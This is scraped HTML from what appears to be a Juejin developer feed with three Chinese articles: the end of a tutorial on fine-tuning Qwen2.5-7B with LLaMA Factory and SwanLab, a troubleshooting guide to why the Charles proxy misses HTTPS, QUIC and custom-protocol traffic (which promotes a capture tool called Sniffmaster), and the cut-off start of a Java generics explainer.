<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bc92c309c354447964f2c7ec76dc1f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=adFO88Sgkjg9xsFNRVyXriN0S58%3D" alt="" loading="lazy"/></p>
<p>总共生成了173个问答对</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7167b5eca834bcc99b722cbc5002ec9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=YkAyifBIplW2K10wKwB6R2y6D3I%3D" alt="" loading="lazy"/></p>
<p>点开其中一个问答对，效果如图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b0d9827d30d4a50864f2eae654c8365~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=VXi00J3HTIKZXBMRe1b1D2769y0%3D" alt="" loading="lazy"/></p>
<p>上面问答对的原文内容如上，可以看出模型对于知识点的提取还是相当准确且有价值的</p>
<p>下一步，我们直接导出微调数据集便可以开始微调。</p>
<h2 data-id="heading-8">三、 微调大语言模型</h2>
<h4 data-id="heading-9">3.1 成本估算</h4>
<p>在本次的演示中，我使用的是Qwen2.5-7B-Instruct模型，模型的大小为70亿参数，权重文件约15GB。在默认参数下，在NVIDIA A100-PCIE-40GB显卡上进行微调，占用19.79GB显存。<strong>一般来说，只要显卡显存大于19.79GB便可以完全复现本次实验，例如4090 24GB也是可以运行的。</strong></p>
<h4 data-id="heading-10">3.2 微调工具的部署</h4>
<p>为了微调大语言模型，这边我们可以使用llamafactory进行微调，Swanlab进行模型训练的监测，由于<strong>llamafactory是自带Swanlab适配的，所以仅需要在llamafactory中配置Swanlab秘钥即可</strong>。</p>
<p>关于llamafactory的部署，可以参考其中官方文档</p>
<p>安装 - LLaMA Factoryllamafactory.readthedocs.io/zh-cn/latest/getting_started/installation.html</p>
<p>安装完成后，按照文档中的要求，<strong>导入我们刚才生成的数据集到<code>data</code>文件夹下</strong>，之后记得<strong>在<code>data_info.json</code>进行注册</strong>，启动llamafactory之后我们便可以预览数据集了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5b6e0fcf3084fb58dde3f5f9c92a0c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=nK8K0ZNBGh%2BEwvuYoeOzJV%2FisOg%3D" alt="" loading="lazy"/></p>
<p>预览数据集，确保选中正确的文件</p>
<h4 data-id="heading-11">3.3 启用训练参数的监测工具</h4>
<p>为了实时监测训练的状态，可以使用Swanlab作为一个<strong>跟踪、记录、比较、和协作实验</strong>的平台，这个工具支持实时云端同步训练的参数变化。可以在官网注册一个API，添加到llamafactory中即可</p>
<p>SwanLab官方文档 | 先进的AI团队协作与模型创新引擎docs.swanlab.cn/</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fdb71d8cbd540d8b3470efce40d3cce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=UiIA6fNVidPNyzcdM2uygZpJdwA%3D" alt="" loading="lazy"/></p>
<p>llamafactory中启用swanlab</p>
<p>配置好参数后便可以愉快地开启训练啦~</p>
<p>在Chat处我们首先测试下没有经过领域数据集微调的模型回答的效果，大模型由于在早期的预训练阶段已经学习大量的公开知识，所以具备一定的知识储备，但是这边和我们期望的垂直应用的回答还是有一定的区别。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa66ea9366444e0692a44da852675288~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=X7nj5HqOFS88E9ci0rC7msPUv%2F4%3D" alt="" loading="lazy"/></p>
<p>原始模型的回答</p>
<p><strong>这边我们选择好刚才训练的检查点路径</strong>，就可以体验学习了新知识后的模型了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55f387f01fcd4850af4b87209ed6cb71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=GU2pNYbLN2ZioAu5RI4ywnMog9E%3D" alt="" loading="lazy"/></p>
<p>可以看出大模型已经把这些知识学进去了</p>
<p>在Swanlab中，我们也可以查看刚才训练的各项参数曲线，<strong>下面的是我训练过程的参数曲线</strong>（这边我简略地设置了下训练参数，效果可能不佳，具体的需要考虑数据集的数量，基模型大小等因素）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a4905b3d99c4d6fa6ba5dcb083e2337~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=C8zd4HeWA%2Fxk8jMTXd8xS6FbNjM%3D" alt="" loading="lazy"/></p>
<p>SwanLab基线社区搜索作者ID cathelloya</p>
<h2 data-id="heading-12">四、 小结</h2>
<p>本文绍了如何将领域内零散的知识文档用于微调大语言模型。首先，通过MinerU等工具<strong>将PDF、DOCX等文件统一转换为Markdown格式</strong>。接着，利用Easy-dataset并结合基础大模型（如通过Ollama部署），<strong>将Markdown文档内容自动化地构建成问答数据集</strong>。最后，<strong>使用LLaMA Factory框架加载此数据集对大模型进行微调</strong>，并<strong>借助SwanLab等工具实时监控训练过程</strong>，从而训练出一个能理解特定领域知识的垂直领域大模型。</p>
<h3 data-id="heading-13">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Charles 抓不到包怎么办？HTTPS 抓包失败、TCP 数据流异常与底层补抓方案全解析]]></title>    <link>https://juejin.cn/post/7579811819666751540</link>    <guid>https://juejin.cn/post/7579811819666751540</guid>    <pubDate>2025-12-04T09:44:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579811819666751540" data-draft-id="7579785426266685440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Charles 抓不到包怎么办？HTTPS 抓包失败、TCP 数据流异常与底层补抓方案全解析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T09:44:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aiopencode"/> <meta itemprop="url" content="https://juejin.cn/user/1898230261493865"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Charles 抓不到包怎么办？HTTPS 抓包失败、TCP 数据流异常与底层补抓方案全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1898230261493865/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aiopencode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:44:15.000Z" title="Thu Dec 04 2025 09:44:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在移动端开发、接口联调、网络调试过程中，<strong>“Charles 抓不到包”</strong> 是开发者遇到的最高频问题之一。尤其是在 iOS 环境下，ATS、证书链校验、App 内证书 Pinning、HTTP/2、HTTP/3（QUIC）等机制会导致代理抓包工具失效。开发者往往只看到 CONNECT、空白请求列表，或者部分 API 能抓、部分完全看不到。</p>
<p>很多人会误以为是 Charles 配置错误，但实际上，大多数抓不到包的问题与 <strong>网络协议本身的工作机制</strong> 相关，而不是工具本身的问题。</p>
<p>本文从工程角度系统分析 Charles 无法抓包的原因，并给出对应的分层解决方案。</p>
<hr/>
<h2 data-id="heading-0">一、Charles 抓不到包的常见原因（按出现频率排序）</h2>
<h3 data-id="heading-1"><strong>证书未被完全信任（iOS/macOS）</strong></h3>
<p>Charles 的 HTTPS 解密依赖“受信任的代理证书”。如果：</p>
<ul>
<li>未安装证书</li>
<li>未开启“完全信任证书”</li>
<li>中间证书不完整</li>
<li>证书链被 Wi-Fi 或代理干扰</li>
</ul>
<p>Charles 会只显示 CONNECT，无法解密。</p>
<hr/>
<h3 data-id="heading-2"><strong>应用启用了证书 Pinning</strong></h3>
<p>Pinning 会拒绝所有中间人代理证书，是 <strong>App 抓不到包的第一常见原因</strong>。</p>
<p>表现：</p>
<ul>
<li>Safari 可以抓</li>
<li>App 完全看不到请求</li>
<li>Charles 无流量</li>
<li>Wireshark 可看到 TLS Alert</li>
</ul>
<p>在这种情况下，Charles 无法工作，需要使用底层抓包方案。</p>
<hr/>
<h3 data-id="heading-3"><strong>部分 API 抓不到 → HTTP/3（QUIC）导致</strong></h3>
<p>QUIC 使用 UDP，不走系统代理，因此 Charles/Proxyman/Fiddler <strong>无法抓到任何 QUIC 请求</strong>。</p>
<p>常见于：</p>
<ul>
<li>视频类接口</li>
<li>大流量实时场景</li>
<li>内容流 / 推荐流</li>
<li>CDN 边缘节点</li>
</ul>
<p>此时只能通过底层抓取或关闭 QUIC 解决。</p>
<hr/>
<h3 data-id="heading-4"><strong>App 使用自定义协议（TCP/WebSocket）</strong></h3>
<p>许多 SDK 或业务数据走自定义二进制协议，不经过 HTTP 代理，因此：</p>
<ul>
<li>Charles 看不到</li>
<li>代理软件无流量</li>
<li>tcpdump 或 Sniffmaster 才能看到真实数据流</li>
</ul>
<hr/>
<h3 data-id="heading-5"><strong>系统代理被覆盖（非常常见）</strong></h3>
<p>包括：</p>
<ul>
<li>VPN</li>
<li>安全管控软件</li>
<li>MDM 企业策略</li>
<li>多代理冲突</li>
<li>WireGuard/Clash 等覆盖全局路由</li>
</ul>
<p>导致 Charles 根本接收不到请求。</p>
<hr/>
<h2 data-id="heading-6">二、排查 Charles 抓不到包的正确流程</h2>
<h3 data-id="heading-7"><strong>① 检查证书链（HTTPS 解密失败）</strong></h3>
<p>必查项目：</p>
<ul>
<li>iOS “完全信任证书” 是否开启</li>
<li>Charles 的证书是否最新</li>
<li>是否存在 Wi-Fi 中间代理</li>
<li>ATS 是否拒绝中间人证书</li>
</ul>
<p>如果只有 CONNECT 多半是证书问题。</p>
<hr/>
<h3 data-id="heading-8"><strong>② 浏览器能抓、App 抓不到 → 典型 Pinning</strong></h3>
<p>这是 70% 的开发者误判为“Charles 配置错误”的场景。</p>
<p>解决方式：
Charles 无法处理
需要底层抓包工具进一步分析 TLS 握手</p>
<hr/>
<h3 data-id="heading-9"><strong>③ 某些接口抓不到 → QUIC/UDP</strong></h3>
<p>验证方式：</p>
<ul>
<li>Wireshark 查看是否出现 UDP 443</li>
<li>Safari 刷不出数据，但 App 出现大量 UDP</li>
<li>Fiddler/Charles 只有部分接口显示</li>
</ul>
<p>QUIC 天生绕过代理，因此不能被 Charles 抓到。</p>
<hr/>
<h3 data-id="heading-10"><strong>④ 完全无流量 → 系统代理无效</strong></h3>
<p>需要检查：</p>
<ul>
<li>网络描述文件（MDM）</li>
<li>VPN 状态</li>
<li>macOS 代理是否被覆盖</li>
<li>iOS Wi-Fi 是否被企业代理修改</li>
</ul>
<hr/>
<h2 data-id="heading-11">三、Charles 抓不到包时的底层补抓方法（关键环节）</h2>
<p>当代理工具无法抓包时，必须使用支持 <strong>底层数据流捕获</strong> 的工具，直接捕获真实的：</p>
<ul>
<li>HTTPS/TCP 数据流</li>
<li>TLS 握手</li>
<li>UDP/QUIC</li>
<li>自定义协议数据</li>
<li>App 内网络框架发送的所有数据</li>
</ul>
<hr/>
<h2 data-id="heading-12"><strong>Sniffmaster 在 Charles 抓不到包场景中的作用）</strong></h2>
<h3 data-id="heading-13"><strong>Sniffmaster 能做什么？</strong></h3>
<ul>
<li>抓取 <strong>HTTPS / TCP / UDP</strong> 真实数据流</li>
<li>自动识别协议类型（HTTP、HTTPS、mdns 等）</li>
<li>支持按 <strong>App / 域名过滤流量</strong>，减少噪音</li>
<li>查看数据流文本、HEX、二进制内容</li>
<li>用 JavaScript 拦截器改写请求/响应（非 pinning 场景）</li>
<li>导出 <strong>Wireshark 可读取的 pcap</strong></li>
<li>跨平台支持 macOS / Windows / iOS</li>
</ul>
<p>尤其适用于：</p>
<ul>
<li>Charles 抓不到 HTTPS（pinning）</li>
<li>QUIC 流量抓不到</li>
<li>WebSocket 二进制协议</li>
<li>自定义 TCP 协议</li>
<li>系统代理失效</li>
</ul>
<p>它不是替代 Charles，而是 Charles 的补充工具。</p>
<hr/>
<h2 data-id="heading-14">四、完整实战：Charles 抓不到包的排查示例</h2>
<h3 data-id="heading-15"><strong>现象：</strong></h3>
<ul>
<li>iOS App 完全抓不到包</li>
<li>Charles 显示 CONNECT</li>
<li>Safari 可抓</li>
<li>App 报网络错误</li>
</ul>
<h3 data-id="heading-16"><strong>排查步骤：</strong></h3>
<h4 data-id="heading-17">✔ 第一步：检查证书</h4>
<p>无异常。</p>
<h4 data-id="heading-18">✔ 第二步：检查系统代理</h4>
<p>可正常工作。</p>
<h4 data-id="heading-19">✔ 第三步：初步判断为 pinning</h4>
<p>代理工具失效。</p>
<h4 data-id="heading-20">✔ 第四步：使用 Sniffmaster 捕获底层数据流</h4>
<p>捕获 TLS 握手失败的记录：</p>
<ul>
<li>Wireshark 分析 pcap → 出现 <code>unknown_ca</code></li>
<li>表示 App 拒绝代理证书 → pinning 生效</li>
</ul>
<p>最终定位到 App 内部 SDK 使用了证书指纹校验。</p>
<hr/>
<h2 data-id="heading-21">Charles 抓不到包的解决方案可以“分层抓包”</h2>

























<table><thead><tr><th>层级</th><th>工具</th><th>作用</th></tr></thead><tbody><tr><td>代理层</td><td>Charles / Proxyman / Fiddler</td><td>业务层 HTTPS 抓包</td></tr><tr><td>协议层</td><td>Wireshark / tcpdump</td><td>分析 TLS 握手、QUIC、TCP</td></tr><tr><td>补抓层</td><td>抓包大师（Sniffmaster）</td><td>捕获 HTTPS/TCP/UDP 底层数据流、解决 pinning/QUIC</td></tr></tbody></table>
<p>没有任何工具能独立覆盖所有场景，但三个层级组合能应对全部复杂抓包需求。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 泛型支持的类型]]></title>    <link>https://juejin.cn/post/7579805639434731572</link>    <guid>https://juejin.cn/post/7579805639434731572</guid>    <pubDate>2025-12-04T09:35:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579805639434731572" data-draft-id="7579811819666554932" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 泛型支持的类型"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T09:35:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小周在成长"/> <meta itemprop="url" content="https://juejin.cn/user/3632442150752573"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 泛型支持的类型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3632442150752573/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小周在成长
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:35:13.000Z" title="Thu Dec 04 2025 09:35:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、一句话总结</h2>
<p><strong>泛型类型参数可以是：类、接口、数组，不能是：基本类型、具体值、实例</strong></p>
<h2 data-id="heading-1">二、允许的类型</h2>
<h3 data-id="heading-2">1. <strong>类和接口</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ✅ 引用类型都可以</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {}  <span class="hljs-comment">// T可以是任何引用类型</span>

Box&lt;String&gt; stringBox;         <span class="hljs-comment">// 类</span>
Box&lt;Integer&gt; integerBox;       <span class="hljs-comment">// 包装类</span>
Box&lt;List&lt;String&gt;&gt; listBox;     <span class="hljs-comment">// 泛型类</span>
Box&lt;Comparable&gt; compBox;       <span class="hljs-comment">// 接口</span>
Box&lt;Runnable&gt; runnableBox;     <span class="hljs-comment">// 函数式接口</span>
</code></pre>
<h3 data-id="heading-3">2. <strong>通配符类型</strong></h3>
